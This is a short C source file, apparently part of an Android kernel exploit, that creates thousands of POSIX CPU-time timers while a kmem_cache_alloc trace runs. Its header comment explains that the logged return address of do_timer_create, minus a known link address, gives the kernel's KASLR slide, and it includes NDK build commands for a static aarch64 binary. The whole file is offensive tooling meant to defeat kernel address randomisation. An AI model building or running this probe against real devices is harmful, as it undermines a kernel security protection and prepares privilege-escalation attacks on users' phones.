/* timer_probe.c - create N CLOCK_THREAD_CPUTIME_ID timers to make
 * do_timer_create() allocate from posix_timers_cache while a
 * kmem_cache_alloc trace capture is running.
 *
 * Each allocation record carries the runtime return address
 * do_timer_create+0xa8 == TIMER_LINK + slide, so the caller values
 * found for bytes_req == sizeof(struct k_itimer) directly give the
 * KASLR slide.
 *
 * build (NDK):
 *   clang --target=aarch64-linux-android21 --sysroot=<ndk>/toolchains/llvm/prebuilt/windows-x86_64/sysroot \
 *         -O2 -std=gnu11 -D_GNU_SOURCE -static -fno-pic -no-pie timer_probe.c -o timer_probe
 */
#define _GNU_SOURCE 1
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

int timer_probe_main(int argc, char **argv)
{
	int n = argc > 1 ? atoi(argv[1]) : 2048;
	int hold = argc > 2 ? atoi(argv[2]) : 2;
	struct sigevent event;
	timer_t *ids;
	int made = 0;
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(0, &set);
	(void)sched_setaffinity(0, sizeof(set), &set);

	ids = calloc((size_t)n, sizeof(*ids));
	if (!ids)
		return 1;
	memset(&event, 0, sizeof(event));
	event.sigev_notify = SIGEV_NONE;
	for (int i = 0; i < n; i++) {
		if (timer_create(CLOCK_THREAD_CPUTIME_ID, &event, &ids[i]))
			break;
		made++;
	}
	dprintf(STDOUT_FILENO, "[kaslr] made=%d\n", made);
	if (hold > 0)
		sleep((unsigned)hold);
	for (int i = 0; i < made; i++)
		timer_delete(ids[i]);
	free(ids);
	dprintf(STDOUT_FILENO, "[kaslr] done\n");
	return made > 0 ? 0 : 2;
}
